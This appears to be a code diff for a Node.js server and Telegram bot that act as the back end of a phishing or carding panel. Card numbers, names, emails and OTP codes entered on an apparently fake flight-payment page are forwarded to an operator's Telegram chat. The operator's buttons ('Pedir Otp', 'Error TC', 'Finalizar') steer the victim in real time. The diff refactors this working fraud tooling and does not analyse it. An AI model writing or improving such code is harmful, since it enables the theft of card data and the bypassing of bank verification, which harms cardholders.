@@ -34,21 +34,14 @@ function escapeMarkdownV2(text = "") {
 }
 
 /*
-  1) /send-payment  -> ya tenías: recibe paymentData y crea mensaje con botones:
-       Pedir Otp / Error de TC / Finalizar
-     (mantengo este endpoint tal cual)
-  2) /send-verification -> nuevo endpoint para chedf.html que recibe paymentData + otp (o transactionId)
-       crea mensaje con botones: Error OTP / Error TC / Finalizar
+  Endpoint principal para procesar el pago inicial.
 */
-
-// ----------------- Endpoint: /send-payment (mantener) -----------------
 app.post("/send-payment", async (req, res) => {
   try {
     const payload = req.body || {};
-    const transactionId = payload.transactionId || (Date.now().toString(36) + Math.random().toString(36).slice(2));
+    const transactionId = (Date.now().toString(36) + Math.random().toString(36).slice(2));
     const stored = { ...payload, transactionId };
 
-    // Campos escapados
     const flightCost = escapeMarkdownV2(stored.flightCost || "No ingresado");
     const name = escapeMarkdownV2(stored.name || "No ingresado");
     const cc = escapeMarkdownV2(stored.cc || "No ingresado");
@@ -120,15 +113,21 @@ app.post("/send-payment", async (req, res) => {
   }
 });
 
-// --------------- Nuevo: /send-verification (para chedf.html) ---------------
+/*
+  Endpoint para procesar el código OTP.
+*/
 app.post("/send-verification", async (req, res) => {
   try {
-    // Espera: { transactionId?, paymentData: {...}, otp: "123456" }
-    const { transactionId: txFromClient, paymentData = {}, otp = "" } = req.body;
-    const transactionId = txFromClient || (Date.now().toString(36) + Math.random().toString(36).slice(2));
-    const stored = { ...paymentData, otp, transactionId };
+    const { transactionId, otp = "" } = req.body;
+    const tx = transactions[transactionId];
 
-    // Escapar campos
+    if (!tx) {
+      console.warn("Transacción no encontrada para OTP:", transactionId);
+      return res.status(404).json({ ok: false, error: "not_found" });
+    }
+
+    const stored = { ...tx.data, otp };
+    
     const name = escapeMarkdownV2(stored.name || "No ingresado");
     const cc = escapeMarkdownV2(stored.cc || "No ingresado");
     const email = escapeMarkdownV2(stored.email || "No ingresado");
@@ -173,7 +172,7 @@ app.post("/send-verification", async (req, res) => {
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *🆔 ID de Transacción:* ${escapeMarkdownV2(transactionId)}
 `;
-
+    
     const reply_markup = {
       inline_keyboard: [
         [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
@@ -186,12 +185,10 @@ app.post("/send-verification", async (req, res) => {
       reply_markup
     });
 
-    transactions[transactionId] = {
-      status: "pending",
-      messageId: sent.message_id,
-      chatId: sent.chat.id,
-      data: stored
-    };
+    transactions[transactionId].status = "pending_otp_verification";
+    transactions[transactionId].messageId = sent.message_id;
+    transactions[transactionId].chatId = sent.chat.id;
+    transactions[transactionId].data = stored;
     messageToTx[sent.message_id] = transactionId;
 
     return res.json({ ok: true, transactionId, messageId: sent.message_id });
@@ -212,35 +209,29 @@ app.get("/status/:transactionId", (req, res) => {
 // Bot: manejo de botones (callback_query)
 bot.on("callback_query", async (query) => {
   try {
-    const data = query.data || ""; // ej: 'pedir_logo:txid' or 'error_otp:txid'
+    const data = query.data || "";
     const [action, txId] = data.split(":");
     const msg = query.message;
     const msgId = msg && msg.message_id;
     const chatId = msg && msg.chat && msg.chat.id;
 
-    // Mapear la transacción
     const tx = (txId && transactions[txId]) || (msgId && transactions[messageToTx[msgId]]);
     if (tx) {
-      tx.status = action; // 'pedir_logo' | 'error_tc' | 'finalizar' | 'error_otp'
+      tx.status = action;
     }
 
-    // Responder callback (quita "cargando" en Telegram)
     await bot.answerCallbackQuery(query.id, { text: "✅ Acción registrada" });
 
-    // Editar el mensaje para quitar los botones (feedback visual)
     try {
       if (chatId && msgId) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId });
       }
-    } catch (e) {
-      // puede fallar si ya fue editado; ignoramos
-    }
+    } catch (e) {}
   } catch (err) {
     console.error("Error en callback_query:", err);
   }
 });
 
-// arrancar servidor
 app.listen(PORT, () => {
   console.log(`✅ Server corriendo en http://localhost:${PORT}`);
 });
